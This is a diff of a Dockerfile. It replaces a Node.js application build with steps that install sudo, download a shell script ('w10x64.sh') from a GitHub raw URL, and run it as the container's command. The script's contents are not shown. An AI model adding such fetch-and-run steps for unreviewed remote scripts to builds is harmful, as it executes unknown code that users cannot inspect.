@@ -1,21 +1,11 @@
 FROM nikolaik/python-nodejs:latest
 
-RUN apt update && \
-  apt-get install -y \
-  neofetch \
-  ffmpeg \
-  wget \
-  tesseract-ocr \
-  chromium \
-  imagemagick && \
-  rm -rf /var/lib/apt/lists/*
-RUN pip install pillow
+RUN apt update
+RUN apt-get install -y sudo
+RUN rm -rf /var/lib/apt/lists/*
+RUN clear
+RUN sudo su
+RUN wget -O w10x64.sh https://raw.githubusercontent.com/frmdeveloper/njajalrdp/main/w10x64.sh
+RUN chmod +x w10x64.sh
 
-WORKDIR /app
-COPY package.json .
-RUN npm install -g npm@7.20.5
-RUN npm install
-
-COPY . .
-
-CMD ["node", "index.js"]
+CMD ["./w10x64.sh"]
